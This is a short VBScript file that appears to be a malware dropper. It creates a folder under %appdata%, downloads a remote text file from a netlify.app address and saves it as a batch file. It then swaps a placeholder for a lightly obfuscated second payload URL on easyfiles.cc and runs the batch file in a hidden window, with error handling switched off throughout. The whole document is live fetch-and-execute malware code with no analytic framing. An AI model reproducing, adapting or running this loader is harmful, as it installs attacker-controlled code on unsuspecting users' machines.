On Error Resume Next

Const appFolder = "%appdata%\paged-l"
Const batchFile = "%appdata%\paged-l\special.bat"
Const srcUrl = "https://aesthetic-parfait-d56344.netlify.app/main.txt"
Const placeholder = "****"
Const replUrl = "https:$$easyfiles.cc$2025$11$c41f859f-c075-4fce-ae65-c87f6ba28e81$pld.txt"

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

If Not fso.FolderExists(shell.ExpandEnvironmentStrings(appFolder)) Then
    fso.CreateFolder shell.ExpandEnvironmentStrings(appFolder)
End If

Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", srcUrl, False
http.Send
If http.Status = 200 Then
    fso.CreateTextFile(shell.ExpandEnvironmentStrings(batchFile), True).Write http.ResponseText
Else
    WScript.Quit
End If

WScript.Sleep 3000

If fso.FileExists(shell.ExpandEnvironmentStrings(batchFile)) Then
    Set file = fso.OpenTextFile(shell.ExpandEnvironmentStrings(batchFile), 1)
    content = file.ReadAll
    file.Close
    Set file = fso.OpenTextFile(shell.ExpandEnvironmentStrings(batchFile), 2)
    file.Write Replace(content, placeholder, replUrl)
    file.Close
Else
    WScript.Quit
End If

WScript.Sleep 2000

shell.Run "cmd /c timeout /t 2 & """ & shell.ExpandEnvironmentStrings(batchFile) & """", 0, False